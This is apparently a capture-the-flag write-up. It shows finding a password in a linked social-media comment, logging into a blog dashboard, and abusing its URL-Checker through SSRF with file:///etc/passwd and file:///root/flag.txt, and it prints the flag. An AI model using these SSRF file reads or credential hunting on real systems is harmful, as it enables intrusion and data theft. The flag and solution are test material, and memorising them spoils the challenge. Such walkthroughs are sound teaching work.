## The Blogger

## Description
```
Me and some friends made this super awesome Blogging website.

Can you find any potential security issues?
```

## Writeup

Starting off, we should take a look at the website. <br/>
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../static/style.css">
    <script src="https://kit.fontawesome.com/b7b4b27f8b.js" crossorigin="anonymous"></script>
    <title>R4P1D-BL0G</title>
</head>
<body>
    <nav id="navBar">
        <a class="navTitle" href="/">R4P1D-BL0G</a>
        <div class="navLinks">
            
            
            <a class="navLink" href="/login">Login</a>
            
            <a class="navLink" href="/about">About</a>
            <a class="navLink" href="/contact">Contact</a>
        </div>
    </nav>

    <div id="posts">
        
            <div class="postContainer">
                <h1 style="margin-top: 10px; margin-bottom: 10px;">The Rise of Artificial Intelligence</h1>
                <p>Artificial Intelligence (AI) is revolutionizing various industries, from healthcare to finance. In this post, we explore the latest advancements in AI technology, its potential applications, and the ethical considerations surrounding its development and implementation.</p>
                <div class="postBottom">
                    <div class="author-info">Written by: Dejan</div>
                    <ul class="social-icons">
                        <li><a href="https://twitter.com/bozo_kiss" target="_blank"><i class="fab fa-twitter"></i></a></li>
                        <li><a href="https://www.instagram.com/mr__whoam.i/" target="_blank"><i class="fab fa-instagram"></i></a></li>
                        <li><a href="https://www.linkedin.com/in/jeff-delaney/" target="_blank"><i class="fab fa-linkedin"></i></a></li>
                    </ul>
                </div>
            </div>

            ------------------

                        <div class="postContainer">
                <h1 style="margin-top: 10px; margin-bottom: 10px;">The Promise of Quantum Computing</h1>
                <p>Quantum computing has the potential to revolutionize computing as we know it, offering exponential processing power and the ability to solve complex problems at speeds previously thought impossible. In this post, we explore the fundamentals of quantum computing, its current state of development, and the possibilities it holds for the future.</p>
                <div class="postBottom">
                    <div class="author-info">Written by: Begga</div>
                    <ul class="social-icons">
                        <li><a href="https://twitter.com/ai_sentinel" target="_blank"><i class="fab fa-twitter"></i></a></li>
                        <li><a href="https://www.instagram.com/mr__whoam.i/" target="_blank"><i class="fab fa-instagram"></i></a></li>
                        <li><a href="https://www.linkedin.com/in/jeff-delaney/" target="_blank"><i class="fab fa-linkedin"></i></a></li>
                    </ul>
                </div>
            </div>

            ------------------

    </div>
</body>
</html>
```

Looking at the html code we can see some blog-posts. One is different from the others though because it contains the link `https://twitter.com/ai_sentinel`. <br/>
If we take a look at the posts of the user `@ai_sentinel` we can find [this post](https://twitter.com/ai_sentinel/status/1682281038884532224). <br/>
Looking at the comment of the post we can find [a comment](https://twitter.com/ai_sentinel/status/1682282144243040257) which contains the password `d0ck3rsw4rm`. <br/>
Using this password we can then log into the website with the credentials `Winkla:d0ck3rsw4rm`. <br/>

After logging in, we gain access to a newly introduced webpage located at `/dashboard`. <br/>
On that webpage there is a tool called `URL-Checker` which essentially takes an `URL` as input and returns the html contents of the page. <br/>
Testing the input, we can actually execute SSRF(Server Side Request Forgery) and read local files instead. <br/>
Using the URL `file:///etc/passwd` we get the output below. <br/>
```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin 
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
```

Knowing this we can enumerate the file system until we finally find `file:///root/flag.txt` which returns the following: <br/>
```
Here, grab your flag: TH{2e317b7a-f36c-11ee-b1bc-fbd82bddf705} 
```